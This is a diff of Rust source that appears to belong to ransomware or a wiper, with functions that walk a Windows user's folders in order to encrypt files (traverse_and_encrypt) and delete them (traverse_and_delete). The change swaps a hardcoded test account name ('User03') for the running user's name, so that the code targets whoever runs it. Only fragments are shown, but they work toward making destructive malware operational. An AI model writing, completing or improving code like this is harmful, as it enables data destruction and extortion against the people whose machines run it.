@@ -67,7 +67,7 @@ pub fn traverse_and_encrypt() {
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
-            full_path.push_str("User03");
+            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
@@ -77,7 +77,7 @@ pub fn traverse_and_encrypt() {
         }
 
         let mut full_path = String::from("C:\\Users\\");
-        full_path.push_str("User03");
+        full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
         full_path.push_str("\\encrypt_date.txt");
 
         let full_path: CString = CString::new(full_path).unwrap();
@@ -246,7 +246,7 @@ pub fn traverse_and_delete() {
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
-            full_path.push_str("User03");
+            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
